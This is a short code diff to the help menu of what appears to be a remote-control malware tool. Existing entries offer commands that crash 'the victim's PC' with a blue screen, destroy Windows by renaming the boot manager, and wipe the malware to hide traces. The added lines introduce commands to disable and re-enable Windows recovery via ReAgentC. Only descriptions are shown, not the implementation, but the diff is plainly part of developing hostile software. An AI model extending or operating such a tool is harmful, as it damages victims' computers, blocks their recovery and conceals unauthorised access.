@@ -419,6 +419,8 @@ help = {
         'bsod': ['➡️ `.bsod`', 'Triggers a Blue Screen of Death on the victim\'s PC.'],
         'jumpscare': ['➡️ `.jumpscare`', 'Plays a very loud & rapidly flashing video.'],
         'winbreak': ['➡️ `.winbreak`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
+        'disable-reset': ['➡️ `.disable-reset`', 'Disables windows recovery (ReAgentC)'],
+        'enable-reset': ['➡️ `.enable-reset`', 'Enables windows recovery (ReAgentC)'],
         'implode': ['➡️ `.implode`', 'Entirely wipes the malware off of the victim\'s PC (to remove traces).']
     }
 }
